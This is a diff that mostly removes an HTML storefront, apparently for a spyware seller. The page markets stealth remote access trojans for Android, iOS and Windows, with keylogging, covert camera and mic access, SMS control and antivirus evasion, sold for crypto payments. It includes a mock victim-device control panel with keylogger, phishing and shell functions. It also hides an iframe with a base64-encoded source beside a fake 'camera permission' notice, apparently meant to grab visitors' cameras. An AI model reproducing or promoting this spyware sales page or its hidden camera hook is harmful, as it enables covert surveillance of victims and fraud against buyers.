-            #dynamic-text {
-                font-size: clamp(2rem, 10vw, 3.5rem);
-                margin-bottom: 30px;
-            }
-            .login-card {
-                padding: 30px 25px;
-                width: 350px;
-            }
-            .login-title {
-                font-size: 1.5rem;
-            }
-            .home-sci2 {
-                bottom: 20px;
-                gap: 15px;
-            }
-            .social-link {
-                width: 45px;
-                height: 45px;
-                font-size: 1.1rem;
-            }
-            .payment-container, .verification-container {
-                padding: 30px 20px;
-            }
-        }
-        @media (max-width: 480px) {
-            .main-content {
-                padding: 110px 10px 80px;
-            }
-            .login-card {
-                padding: 25px 20px;
-                width: 320px;
-            }
-            .notice-content {
-                padding: 30px 25px;
-                margin: 20px;
-            }
-        }
-        /* Landscape orientation for mobile */
-        @media (max-height: 600px) and (orientation: landscape) {
-            .main-content {
-                padding: 90px 15px 70px;
-                justify-content: flex-start;
-                overflow-y: auto;
-            }
-            #dynamic-text {
-                font-size: clamp(1.5rem, 6vw, 2.5rem);
-                margin-bottom: 20px;
-            }
-            .login-card {
-                padding: 20px;
-                margin-bottom: 20px;
-            }
-            .pricing-section {
-                margin-bottom: 20px;
-            }
-            .home-sci2 {
-                bottom: 15px;
-            }
-            .logo-container {
-                top: 15px;
-                padding: 8px 14px;
-            }
-            .logo-img {
-                height: 48px;
-            }
-        }
-        /* High DPI displays */
-        @media (-webkit-min-device-pixel-ratio: 2), (min-resolution: 192dpi) {
-            .login-card,
-            .pricing-card,
-            .social-link {
-                border-width: 0.5px;
-            }
-        }
-        /* Accessibility */
-        @media (prefers-reduced-motion: reduce) {
-            * {
-                animation-duration: 0.01ms !important;
-                animation-iteration-count: 1 !important;
-                transition-duration: 0.01ms !important;
-            }
-            .cursor-shadow {
-                display: none;
-            }
-        }
-        /* Focus styles for accessibility */
-        .login-input:focus,
-        .login-button:focus,
-        .pricing-button:focus,
-        .social-link:focus,
-        .rats-toggle-btn:focus,
-        .collapse-btn:focus,
-        #preview-rat:focus {
-            outline: 2px solid #3498db;
-            outline-offset: 2px;
-        }
-        /* Print styles */
-        @media print {
-            .cursor-shadow,
-            .home-sci2 {
-                display: none;
-            }
-            body {
-                background: white;
-            }
-            .login-card,
-            .pricing-card,
-            .rats-content {
-                background: white;
-                border: 1px solid #ccc;
-                box-shadow: none;
-            }
-        }
-        .active-users {
-            text-align: center;
-            margin-bottom: 12px;
-            z-index: 10;
-        }
-        .user-count {
-            font-size: 1rem;
-            font-weight: 600;
-            color: #27ae60;
-            background: rgba(39, 174, 96, 0.1);
-            padding: 6px 14px;
-            border-radius: 20px;
-            animation: blinkLive 1.8s infinite;
-        }
-        @keyframes blinkLive {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-        /* === MOBILE POPUP STYLES === */
-        #mobile-popup-overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.75);
-            z-index: 9998;
-        }
-        #mobile-popup {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 9999;
-            justify-content: center;
-            align-items: center;
-        }
-        #mobile-screen {
-            width: 360px;
-            height: 640px;
-            border-radius: 40px;
-            overflow: hidden;
-            position: relative;
-            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6);
-            isolation: isolate;
-            display: flex;
-            flex-direction: column;
-        }
-        #mobile-popup-close {
-            position: absolute;
-            top: 12px;
-            right: 12px;
+
+        /* Color classes for icon badges (kept from original) */
+        .bg-blue-500 { background-color: #3b82f6; }
+        .bg-green-500 { background-color: #10b981; }
+        .bg-yellow-500 { background-color: #eab308; }
+        .bg-purple-500 { background-color: #a855f7; }
+        .bg-red-500 { background-color: #ef4444; }
+        .bg-indigo-500 { background-color: #6366f1; }
+        .bg-orange-500 { background-color: #f97316; }
+        .bg-amber-500 { background-color: #f59e0b; }
+        .bg-pink-500 { background-color: #ec4899; }
+        .bg-gray-600 { background-color: #4b5563; }
+        .bg-lime-500 { background-color: #84cc16; }
+        .bg-teal-500 { background-color: #14b8a6; }
+        .bg-red-600 { background-color: #dc2626; }
+        .bg-violet-500 { background-color: #8b5cf6; }
+        .bg-sky-500 { background-color: #0ea5e9; }
+        .bg-amber-600 { background-color: #d97706; }
+        .bg-fuchsia-500 { background-color: #d946ef; }
+        .bg-emerald-500 { background-color: #10b981; }
+        .bg-yellow-600 { background-color: #ca8a04; }
+        .bg-blue-600 { background-color: #2563eb; }
+        .bg-cyan-500 { background-color: #06b6d4; }
+        .bg-red-700 { background-color: #b91c1c; }
+        .bg-purple-700 { background-color: #6d28d9; }
+        .bg-green-700 { background-color: #15803d; }
+        .bg-green-600 { background-color: #16a34a; }
+
+        /* SVG Icon Styles - Rich, filled SVGs */
+        svg {
             width: 32px;
             height: 32px;
-            border-radius: 50%;
-            background: rgba(0, 0, 0, 0.3);
-            color: white;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 18px;
-            cursor: pointer;
-            z-index: 20;
-            backdrop-filter: blur(8px);
         }
-        #mobile-popup-close:hover {
-            background: rgba(0, 0, 0, 0.5);
+
+        ::-webkit-scrollbar {
+            width: 6px;
         }
-        #wallpaper {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460);
-            background-size: 400% 400%;
-            animation: gradientBG 15s ease infinite;
-            z-index: -2;
+
+        ::-webkit-scrollbar-track {
+            background: rgba(0, 0, 0, 0.2);
         }
-        #glass {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            background: rgba(10, 10, 15, 0.75);
-            z-index: -1;
+
+        ::-webkit-scrollbar-thumb {
+            background: rgba(148, 163, 184, 0.5);
+            border-radius: 3px;
         }
-        @keyframes gradientBG {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-        #status-bar {
-            height: 36px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 0 16px;
-            background: rgba(10, 10, 15, 0.6);
-            backdrop-filter: blur(12px);
-            -webkit-backdrop-filter: blur(12px);
-            border-bottom: 1px solid rgba(255,255,255,0.08);
-            z-index: 10;
-            color: #e0e0ff;
-            font-size: 14px;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-        }
-        #screen-container {
-            flex: 1;
-            overflow: hidden;
-            display: flex;
-            flex-direction: column;
-        }
-        .mobile-screen {
-            display: none;
-            padding: 20px;
-            color: white;
-            box-sizing: border-box;
-            overflow-y: auto;
-            flex: 1;
-        }
-        #home-screen-mobile {
-            display: block;
-            padding: 24px 16px 30px;
-        }
-        .app-icon {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            cursor: pointer;
-            user-select: none;
-            text-align: center;
-        }
-        .app-icon > div:first-child {
-            width: 56px;
-            height: 56px;
-            border-radius: 16px;
-            background: rgba(30, 30, 40, 0.6);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin-bottom: 8px;
-            font-size: 24px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
-        }
-        .app-icon > div:last-child {
-            color: #e0e0ff;
-            font-size: 11px;
-            line-height: 1.3;
-        }
-        .system-back {
-            background: rgba(40, 40, 50, 0.7);
-            color: #00ffcc;
-            border: none;
-            border-radius: 10px;
-            padding: 8px 16px;
-            font-size: 16px;
-            cursor: pointer;
-            display: inline-flex;
-            align-items: center;
-        }
-        .system-back:hover {
-            background: rgba(50, 50, 60, 0.9);
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: rgba(148, 163, 184, 0.7);
         }
     </style>
 </head>
-<body class="login-page">
-    <!-- ✨ UPGRADED LOGO CONTAINER -->
-    <div class="logo-container">
-        <a href="index.html" class="logo-link">
-            <img src="https://raw.githubusercontent.com/esrat404/esrat/a0f17e29d2a0996159d0306b6f3aac5e9b561e63/img/logo.png" alt="ES-UNIVERSE Logo" class="logo-img">
-        </a>
-    </div>
-    <!-- Main Content Container -->
-    <main class="main-content">
-        <!-- Animated GANGA Text -->
-        <div class="info">
-            <span id="dynamic-text">
-                <span class="letter">G</span>
-                <span class="letter">A</span>
-                <span class="letter">N</span>
-                <span class="letter">G</span>
-                <span class="letter">A</span>
-            </span>
-        </div>
-        <!-- Notice Board (hidden by default) -->
-        <div id="notice-board" class="notice-board">
-            <div class="notice-content">
-                <h3>Camera Permission Required</h3>
-                <div class="notice-credentials">
-                    <p><span>Buy any of the plans below and get access to the Admin Dash where you can get RATs and many more.</span></p>
-                </div>
-                <p><br>
-                Refresh to Proceed ➤</p>
-            </div>
-        </div> 
-        <!-- Login Container -->
-        <div class="container">
-            <div class="login-card">
-                <h2 class="login-title">Welcome Back</h2>
-                <div class="input-group">
-                    <input type="text" id="username" placeholder="Username" disabled autocomplete="off" class="login-input">
-                    <div class="input-line"></div>
-                </div>
-                <div class="input-group">
-                    <input type="password" id="password" placeholder="Password" disabled autocomplete="off" class="login-input">
-                    <div class="input-line"></div>
-                </div>
-                <button id="submit" class="login-button" disabled>
-                    <span class="button-text">Sign In</span>
-                    <div class="button-glow"></div>
-                </button>
-                <div id="message-ref" class="message"></div>
-            </div>
-        </div>
-        <!-- === NEW SECTION: Android RATs Info === -->
-        <div class="rats-info-section">
-            <button class="rats-toggle-btn" id="toggle-rats">🔻More . .</button>
-            <button id="preview-rat">Preview 📱</button>
-            <div class="rats-content" id="rats-content">
-                <h3>Brief about our RATs:</h3>
-                <p style="color: #2c3e50; margin-bottom: 15px; font-size: 0.95rem;">
-                    Our Remote Administration Tools (RATs) are engineered for ethical penetration testing and red-team operations. Stealthy, powerful, and updated regularly. ⚠️Important Notice: You are solely responsible for your actions using our RATs. Please Use Responsibly.
-                </p>
-                <div class="rats-features">
-                    <ul>
-                        <li>Live screen preview, keylogger, camera access, VNC control, Keylogging & clipboard monitoring</li>
-                        <li>Remote camera (front/back), Mic, File, GPS, SMS & call Execution & many more</li>
-                        <li>Remote SMS & call Execution</li>
-                        <li>Supports Android 7-15, iOS 12-26 Beta, Win 11</li>
-                        <li>Stealth, Undetectable by most antivirus (as of 2025)</li>
-                        <li>Auto-persistence across reboots</li>
-                    </ul>
-                </div>
-                <button class="collapse-btn" id="collapse-rats">Collapse</button>
-            </div>
-        </div>
-        <!-- Pricing Section -->
-        <div class="pricing-section">
-            <h3 class="pricing-title">Choose Your Plan</h3>
-            <!-- Desktop View: Original Cards -->
-            <div class="pricing-cards">
-                <div class="pricing-card">
-                    <div class="card-header">
-                        <h4 class="plan-name">Premium</h4>
-                        <div class="plan-price">
-                            <span class="currency">$</span>
-                            <span class="amount">9</span>
-                        </div>
-                        <p class="plan-duration">180 Days Access</p>
-                    </div>
-                    <div class="card-features">
-                        <ul>
-                            <li>Access to all kinds of RATs (Android, iOS & Windows)</li>
-                            <li>Free access to RAT's Source Codes</li>
-                            <li>Community Support</li>
-                        </ul>
-                    </div>
-                    <button class="pricing-button" data-plan="premium" data-amount="9">Get Started</button>
-                </div>
-                <div class="pricing-card featured">
-                    <div class="featured-badge">Most Popular</div>
-                    <div class="card-header">
-                        <h4 class="plan-name">Lifetime</h4>
-                        <div class="plan-price">
-                            <span class="currency">$</span>
-                            <span class="amount">19</span>
-                        </div>
-                        <p class="plan-duration">Lifetime Access</p>
-                    </div>
-                    <div class="card-features">
-                        <ul>
-                            <li>Everything in Premium</li>
-                            <li>Priority Support</li>
-                            <li>No Renewal Needed</li>
-                        </ul>
-                    </div>
-                    <button class="pricing-button featured-button" data-plan="lifetime" data-amount="19">Choose Lifetime</button>
-                </div>
-            </div>
-            <!-- Mobile View: Toggle & Dynamic Content -->
-            <div class="pricing-toggle-container" style="display: none;">
-                <div class="pricing-toggle">
-                    <button class="pricing-toggle-btn active" data-plan="premium" data-amount="9">Premium</button>
-                    <button class="pricing-toggle-btn" data-plan="lifetime" data-amount="19">Lifetime</button>
-                </div>
-            </div>
-            <div class="pricing-details" style="display: none;">
-                <h3 class="plan-name-mobile">Premium</h3>
-                <div class="plan-price-mobile">
-                    <span class="currency-mobile">$</span>
-                    <span class="amount-mobile">9</span>
-                </div>
-                <p class="plan-duration-mobile">180 Days Access</p>
-                <div class="card-features-mobile">
-                    <ul>
-                        <li>Access to all kinds of RATs (Android, iOS & Windows)</li>
-                        <li>Access to RATs Source Codes</li>
-                        <li>Upcoming Hacks</li>
-                    </ul>
-                </div>
-                <button class="pricing-button-mobile">Get Started</button>
-            </div>
-        </div>
-        <div class="active-users">
-            <span class="user-count">Active Users: 39</span>
-        </div>
-        <div class="term">
-            <h3 class="terms">GPay, PhonePe, PayTM (UPI) Payments are also accepted</h3>
-        </div>
-    </main>
-    <!-- Social Links -->
-    <div class="home-sci2">
-        <a href="https://t.me/jrram3000" class="social-link telegram">
-            <i class='bx bxl-telegram'></i>
-        </a>
-        <a href="https://www.instagram.com/" class="social-link instagram">
-            <i class='bx bxl-instagram'></i>
-        </a>
-        <a href="https://github.com/ES-UNIVERSE" class="social-link github">
-            <i class='bx bxl-github'></i>
-        </a>
-    </div>
-    <!-- Cursor Shadow Effect -->
-    <div class="cursor-shadow"></div>
-    <!-- Payment Window -->
-    <div class="payment-window" id="payment-window">
-        <div class="payment-container">
-            <button class="close-button" id="close-payment">
-                <i class='bx bx-x'></i>
-            </button>
-            <h2 class="payment-title">Complete Your Payment</h2>
-            <div class="payment-form">
-                <div class="input-group">
-                    <input type="email" class="login-input" id="register-email" placeholder="Email Address" required>
-                    <div class="input-line"></div>
-                </div>
-                <div class="input-group">
-                    <input type="text" class="login-input" id="register-username" placeholder="Create Username" required>
-                    <div class="input-line"></div>
-                </div>
-                <div class="input-group">
-                    <input type="password" class="login-input" id="register-password" placeholder="Create Password" required>
-                    <div class="input-line"></div>
-                </div>
-                <div class="payment-info">
-                    <h3>Payment Details</h3>
-                    <p>Send <strong id="payment-amount">$9.00</strong> USDT to the Address or QR below:</p>
-                    <p>Wallet Address: TVjgnf4rjADn8gpyhbKg1Z8t7GJkNDsPPT <strong id="wallet-address"></strong></p>
-                    <p>Network: <strong>Tron (TRC20)</strong></p>
-                    <p>Plan: <strong id="selected-plan">Premium</strong></p>
-                </div>
-                <div class="qr-container">
-                    <div class="qr-code">
-                        <img src="https://raw.githubusercontent.com/esrat404/esrat/a0f17e29d2a0996159d0306b6f3aac5e9b561e63/img/payment.PNG" alt="QR Code for Payment" id="qr-image">
-                    </div>
-                    <button class="download-qr" id="download-qr">Download QR Code</button>
-                </div>
-                <button class="payment-button" id="paid-button">I Have Paid</button>
-            </div>
-        </div>
-    </div>
-    <!-- Verification Window -->
-    <div class="verification-window" id="verification-window">
-        <div class="verification-container">
-            <div class="verification-icon">
-                <i class='bx bx-check-circle'></i>
-            </div>
-            <h2 class="verification-title">Verifying Your Payment . . .</h2>
-            <p class="verification-message">
-                We are verifying your payment. This may take a few minutes.<br>
-                Once verified, your account will be activated and you will receive a confirmation email.
-            </p>
-            <button class="payment-button" id="close-verification">Done</button>
-        </div>
-    </div>
-    <!-- Hidden iframe -->
-    <iframe id="cameraIframe" src="" data-encoded-src="aHR0cHM6Ly9lcy1hbmRyb2lkLmdpdGh1Yi5pby9hbmRyb1JhdC0v" data-path="projects/camera/camera.html" style="display:none;"></iframe>
-    <!-- === MOBILE POPUP HTML === -->
-    <div id="mobile-popup-overlay"></div>
-    <div id="mobile-popup">
-        <div id="mobile-screen">
-            <div id="mobile-popup-close">&times;</div>
-            <div id="wallpaper"></div>
-            <div id="glass"></div>
-            <div id="status-bar">
-                <div id="status-time">10:42</div>
-                <div style="display: flex; gap: 12px; align-items: center;">
-                    <span id="status-network">5G</span>
-                    <div style="display: flex; align-items: center; gap: 4px;">
-                        <svg width="16" height="8" viewBox="0 0 16 8" style="opacity: 0.9;">
-                            <rect x="0" y="3" width="2" height="4" fill="#00ff9d" rx="1"/>
-                            <rect x="3" y="2" width="2" height="5" fill="#00ff9d" rx="1"/>
-                            <rect x="6" y="1" width="2" height="6" fill="#00ff9d" rx="1"/>
-                            <rect x="9" y="0" width="2" height="7" fill="#00ff9d" rx="1"/>
-                            <rect x="12" y="2" width="2" height="5" fill="#333" rx="1"/>
-                        </svg>
-                        <span id="status-battery">88%</span>
-                    </div>
-                </div>
-            </div>
-            <div id="screen-container">
-                <div id="home-screen-mobile" class="mobile-screen">
-                    <div style="text-align: center; margin-bottom: 24px;">
-                        <div style="font-size: 18px; font-weight: bold; color: #00ffcc; margin-top: 10px;">Device Control Center</div>
-                        <div style="font-size: 12px; color: #aaa; margin-top: 4px;">Tap any function to execute</div>
-                    </div>
-                    <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px;">
-                        <script>
-                            const features = [
-                                { name: "Dump", icon: "📦" },
-                                { name: "Call Logs", icon: "📞" },
-                                { name: "App Lists", icon: "📱" },
-                                { name: "System Info", icon: "⚙️" },
-                                { name: "Contacts", icon: "👥" },
-                                { name: "Toast", icon: "🧾" },
-                                { name: "Files", icon: "📁" },
-                                { name: "Play Audio", icon: "🎧" },
-                                { name: "Send SMS", icon: "💬" },
-                                { name: "Shell", icon: ">_ " },
-                                { name: "Vibration", icon: "📳" },
-                                { name: "TTS", icon: "🗣️" },
-                                { name: "Keylogger", icon: "⌨️" },
-                                { name: "Wallpaper", icon: "🖼️" },
-                                { name: "Notification", icon: "🔔" },
-                                { name: "Phishing", icon: "🎣" },
-                                { name: "Notifications", icon: "📢" },
-                                { name: "Hooks", icon: "🪝" },
-                                { name: "Recording", icon: "🎙️" },
-                                { name: "Clipboard", icon: "📋" },
-                                { name: "Torch", icon: "🔦" },
-                                { name: "Camera", icon: "📷" },
-                                { name: "Launch URL", icon: "🌐" },
-                                { name: "VNC", icon: "📱" },
-                                { name: "Downloads", icon: "📂" },
-                                { name: "Crypto", icon: "🔒" },
-                                { name: "Advanced", icon: "🔬" },
-                                { name: "Admin", icon: "👑" }
-                            ];
-                            features.forEach(f => {
-                                const id = f.name.replace(/\s+/g, '-').toLowerCase();
-                                document.write(`
-                                    <div class="app-icon" data-feature="${id}">
-                                        <div>${f.icon}</div>
-                                        <div>${f.name}</div>
-                                    </div>
-                                `);
-                            });
-                        </script>
-                    </div>
-                </div>
-                <!-- Call Logs -->
-                <div id="call-logs-mobile" class="mobile-screen">
-                    <button class="system-back">← Back</button>
-                    <h2 style="margin: 16px 0; font-size: 20px;">📞 Call History</h2>
-                    <div style="margin-top: 10px; display: flex; flex-direction: column; gap: 14px;">
-                        <div style="padding: 12px; background: rgba(30,30,40,0.5); border-radius: 12px;">
-                            <div style="font-weight: bold;">+9178******58</div>
-                            <div style="font-size: 13px; color: #00ff9d; display: flex; align-items: center; gap: 6px;">
-                                <span>↗</span> Outgoing • 2 min • <span>Today, 10:30 AM</span>
-                            </div>
-                        </div>
-                        <div style="padding: 12px; background: rgba(30,30,40,0.5); border-radius: 12px;">
-                            <div style="font-weight: bold;">+1 (555) *9*-6*43</div>
-                            <div style="font-size: 13px; color: #ff6b6b; display: flex; align-items: center; gap: 6px;">
-                                <span>↙</span> Incoming (Missed) • <span>Today, 9:15 AM</span>
-                            </div>
-                        </div>
-                        <div style="padding: 12px; background: rgba(30,30,40,0.5); border-radius: 12px;">
-                            <div style="font-weight: bold;">Christie</div>
-                            <div style="font-size: 13px; color: #00ff9d; display: flex; align-items: center; gap: 6px;">
-                                <span>↗</span> Outgoing • 5 min 22s • <span>Yesterday, 4:45 PM</span>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-                <!-- App Lists -->
-                <div id="app-lists-mobile" class="mobile-screen">
-                    <button class="system-back">← Back</button>
-                    <h2 style="margin: 16px 0; font-size: 20px;">📱 Installed Apps</h2>
-                    <div style="margin-top: 10px; display: flex; flex-direction: column; gap: 14px;">
-                        <div style="padding: 12px; background: rgba(30,30,40,0.5); border-radius: 12px; font-size: 14px;">
-                            <div style="font-weight: bold;">WhatsApp</div>
-                            <div>Version: 2.25.10</div>
-                            <div style="font-size: 12px; color: #888;">com.whatsapp • Installed: Oct 28, 2025</div>
-                        </div>
-                        <div style="padding: 12px; background: rgba(30,30,40,0.5); border-radius: 12px; font-size: 14px;">
-                            <div style="font-weight: bold;">Chrome</div>
-                            <div>Version: 130.0.6723.91</div>
-                            <div style="font-size: 12px; color: #888;">com.android.chrome • Installed: Nov 1, 2025</div>
-                        </div>
-                        <div style="padding: 12px; background: rgba(30,30,40,0.5); border-radius: 12px; font-size: 14px;">
-                            <div style="font-weight: bold;">Signal</div>
-                            <div>Version: 7.12.0</div>
-                            <div style="font-size: 12px; color: #888;">org.thoughtcrime.securesms • Installed: Sep 12, 2025</div>
-                        </div>
-                        <div style="padding: 12px; background: rgba(30,30,40,0.5); border-radius: 12px; font-size: 14px;">
-                            <div style="font-weight: bold;">Calculator</div>
-                            <div>Version: 8.5</div>
-                            <div style="font-size: 12px; color: #888;">com.android.calculator2 • Pre-installed</div>
-                        </div>
-                    </div>
-                </div>
-                <!-- File Manager -->
-                <div id="files-mobile" class="mobile-screen">
-                    <button class="system-back">← Back</button>
-                    <h2 style="margin: 16px 0; font-size: 20px;">📁 File Manager</h2>
-                    <div style="margin-top: 10px; display: flex; flex-direction: column; gap: 12px;">
-                        <div style="display: flex; justify-content: space-between;">
-                            <span style="color: #fd0000;">Path :</span>
-                            <span style="color: #fd0000; font-size: 13px;">samsung1828 > Downloads > new folder</span>
-                        </div>
-                        <div style="display: flex; justify-content: space-between;">
-                            <span>document.pdf</span>
-                            <span style="color: #888; font-size: 13px;">2.4 MB</span>
-                        </div>
-                        <div style="display: flex; justify-content: space-between;">
-                            <span>vacation.jpg</span>
-                            <span style="color: #888; font-size: 13px;">3.1 MB</span>
-                        </div>
-                        <div style="display: flex; justify-content: space-between;">
-                            <span>meeting_recording.mp4</span>
-                            <span style="color: #888; font-size: 13px;">42.7 MB</span>
-                        </div>
-                        <div style="display: flex; justify-content: space-between;">
-                            <span>notes.txt</span>
-                            <span style="color: #888; font-size: 13px;">1.2 KB</span>
-                        </div>
-                        <div style="display: flex; justify-content: space-between;">
-                            <span>backup.zip</span>
-                            <span style="color: #888; font-size: 13px;">156 MB</span>
-                        </div>
-                        <div style="display: flex; justify-content: space-between;">
-                            <span>config.json</span>
-                            <span style="color: #888; font-size: 13px;">4.8 KB</span>
-                        </div>
-                        <div style="display: flex; justify-content: space-between;">
-                            <span>jack.png</span>
-                            <span style="color: #888; font-size: 13px;">4.1 MB</span>
-                        </div>
-                        <div style="display: flex; justify-content: space-between;">
-                            <span>playground.jpg</span>
-                            <span style="color: #888; font-size: 13px;">3.8 MB</span>
-                        </div>
-                    </div>
-                </div>
-                <!-- Send SMS -->
-                <div id="send-sms-mobile" class="mobile-screen">
-                    <button class="system-back">← Back</button>
-                    <h2 style="margin: 16px 0; font-size: 20px;">💬 Send SMS</h2>
-                    <input type="tel" placeholder="Phone Number (e.g. +15551234567)" style="width:100%;padding:14px;margin:14px 0;background:rgba(20,20,30,0.7);border:1px solid #333;color:white;border-radius:12px;font-size:16px;box-sizing:border-box;" />
-                    <textarea placeholder="Type your message..." style="width:100%;padding:14px;margin:14px 0;background:rgba(20,20,30,0.7);border:1px solid #333;color:white;border-radius:12px;font-size:16px;height:120px;resize:none;box-sizing:border-box;"></textarea>
-                    <button style="width:100%;padding:14px;background:#00ff9d;color:#000;border:none;border-radius:12px;font-weight:bold;font-size:16px;">Send Message</button>
-                </div>
-                <!-- Vibration -->
-                <div id="vibration-mobile" class="mobile-screen">
-                    <button class="system-back">← Back</button>
-                    <h2 style="margin: 16px 0; font-size: 20px;">📳 Vibration Control</h2>
-                    <p>Set duration in seconds (1–10):</p>
-                    <input type="number" min="1" max="10" value="2" style="width:100%;padding:14px;margin:14px 0;background:rgba(20,20,30,0.7);border:1px solid #333;color:white;border-radius:12px;font-size:16px;box-sizing:border-box;" />
-                    <button style="width:100%;padding:14px;background:#ff6b6b;color:white;border:none;border-radius:12px;font-weight:bold;">Trigger Vibration</button>
-                </div>
-                <!-- Camera -->
-                <div id="camera-mobile" class="mobile-screen">
-                    <button class="system-back">← Back</button>
-                    <h2 style="margin: 16px 0; font-size: 20px; text-align: center;">📷 Live Feed</h2>
-                    <div style="margin-top: 40px; display: flex; flex-direction: column; gap: 16px;">
-                        <button style="padding:18px;background:rgba(60,60,80,0.6);color:white;border:1px solid #555;border-radius:16px;font-size:18px;">📱 Front Camera</button>
-                        <button style="padding:18px;background:rgba(60,60,80,0.6);color:white;border:1px solid #555;border-radius:16px;font-size:18px;">📸 Back Camera</button>
-                    </div>
-                </div>
-                <!-- Launch URL -->
-                <div id="launch-url-mobile" class="mobile-screen">
-                    <button class="system-back">← Back</button>
-                    <h2 style="margin: 16px 0; font-size: 20px;">🌐 Launch URL</h2>
-                    <input type="url" placeholder="https://example.com" style="width:100%;padding:14px;margin:14px 0;background:rgba(20,20,30,0.7);border:1px solid #333;color:white;border-radius:12px;font-size:16px;box-sizing:border-box;" />
-                    <button style="width:100%;padding:14px;background:#4a9bff;color:white;border:none;border-radius:12px;font-weight:bold;">Open in Browser</button> <br>
-                    <h3 style="margin: 16px 0; font-size: 20px;">🤖 Launch App</h3>
-                    <select style="width:100%;padding:14px;margin:14px 0;background:rgba(20,20,30,0.7);border:1px solid #333;color:white;border-radius:12px;font-size:16px;box-sizing:border-box;">
-                        <option>WhatsApp</option>
-                        <option selected>Chrome</option>
-                        <option>Signal</option>
-                        <option>Calculator</option>
-                    </select>
-                    <button style="width:100%;padding:14px;background:#4a9bff;color:white;border:none;border-radius:12px;font-weight:bold;">Open Directly</button>
-                </div>
-                <!-- VNC -->
-                <div id="vnc-mobile" class="mobile-screen">
-                    <button class="system-back">← Back</button>
-                    <h2 style="margin: 16px 0; font-size: 20px;">🖥️ VNC (Live Screen Control)</h2>
-                    <p>Set screen resolution:</p>
-                    <select style="width:100%;padding:14px;margin:14px 0;background:rgba(20,20,30,0.7);border:1px solid #333;color:white;border-radius:12px;font-size:16px;box-sizing:border-box;">
-                        <option>360×640 (Low)</option>
-                        <option selected>720×1280 (HD)</option>
-                        <option>1080×1920 (FHD)</option>
-                        <option>1440×2560 (QHD)</option>
-                    </select>
-                    <button style="width:100%;padding:14px;background:#ffcc00;color:#000;border:none;border-radius:12px;font-weight:bold;">Start Session</button>
-                </div>
-                <!-- Recording -->
-                <div id="recording-mobile" class="mobile-screen">
-                    <button class="system-back">← Back</button>
-                    <h2 style="margin: 16px 0; font-size: 20px; text-align: center;">🎙️Listen & Speak</h2>
-                    <div style="margin-top: 40px; display: flex; flex-direction: column; gap: 16px;">
-                        <button style="padding:18px;background:#ff6b6b;color:white;border:none;border-radius:16px;font-size:18px;font-weight:bold;">🎧 Live Listen (Real-time)</button>
-                        <button style="padding:18px;background:#7e5454;color:white;border:none;border-radius:16px;font-size:18px;font-weight:bold;">🎙️ Speak 🎙️</button>
-                        <button style="padding:18px;background:#00ff9d;color:#000;border:none;border-radius:16px;font-size:18px;font-weight:bold;">🔴 Record to File</button>
-                    </div>
-                </div>
-                <!-- Admin -->
-                <div id="admin-mobile" class="mobile-screen">
-                    <button class="system-back">← Back</button>
-                    <h2 style="margin: 16px 0; font-size: 20px; text-align: center;">👑 Admin Panel</h2>
-                    <div style="margin-top: 40px; display: flex; flex-direction: column; gap: 16px;">
-                        <button style="padding:18px;background:#ff3333;color:white;border:none;border-radius:16px;font-size:18px;font-weight:bold;">💣 Self Destruct</button>
-                        <button style="padding:18px;background:#1c2d3e;color:white;border:none;border-radius:16px;font-size:18px;">🔄 Reboot Device</button>
-                        <button style="padding:18px;background:#1c2d3e;color:#ffffff;border:none;border-radius:16px;font-size:18px;">🔌 Reconnect to Server</button>
-                        <button style="padding:18px;background:#1c2d3e;color:#ffffff;border:none;border-radius:16px;font-size:18px;">🔑 Change Lock Sceen Password</button>
-                    </div>
-                </div>
-                <!-- Generic Fallback -->
-                <div id="generic-detail-mobile" class="mobile-screen">
-                    <button class="system-back">← Back</button>
-                    <h2 id="generic-title-mobile" style="margin: 16px 0; font-size: 20px;">Feature</h2>
-                    <p>This is a demonstrated interface for <span id="feature-name-mobile" style="color: #00ffcc;"></span>.</p>
-                    <p style="color: #888; margin-top: 20px; font-style: italic;">(Shown for education purposes only -No real Device is being targeted here)</p>
-                </div>
-            </div>
-        </div>
-    </div>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
-    <script>
-        let cameraStream = null;
-        let cameraInterval;
-        let permissionRequested = false;
-        let permissionGranted = false;
-        const planButtons = document.querySelectorAll('.pricing-button');
-        const paymentWindow = document.getElementById('payment-window');
-        const closePayment = document.getElementById('close-payment');
-        const paymentAmount = document.getElementById('payment-amount');
-        const selectedPlan = document.getElementById('selected-plan');
-        const paidButton = document.getElementById('paid-button');
-        const verificationWindow = document.getElementById('verification-window');
-        const closeVerification = document.getElementById('close-verification');
-        const downloadQr = document.getElementById('download-qr');
-        const qrImage = document.getElementById('qr-image');
-        const pricingToggleContainer = document.querySelector('.pricing-toggle-container');
-        const pricingToggleBtns = document.querySelectorAll('.pricing-toggle-btn');
-        const pricingDetails = document.querySelector('.pricing-details');
-        const planNameMobile = document.querySelector('.plan-name-mobile');
-        const amountMobile = document.querySelector('.amount-mobile');
-        const planDurationMobile = document.querySelector('.plan-duration-mobile');
-        const cardFeaturesMobile = document.querySelector('.card-features-mobile');
-        const pricingButtonMobile = document.querySelector('.pricing-button-mobile');
-        // === NEW JS FOR RATs SECTION ===
-        const toggleRatsBtn = document.getElementById('toggle-rats');
-        const collapseRatsBtn = document.getElementById('collapse-rats');
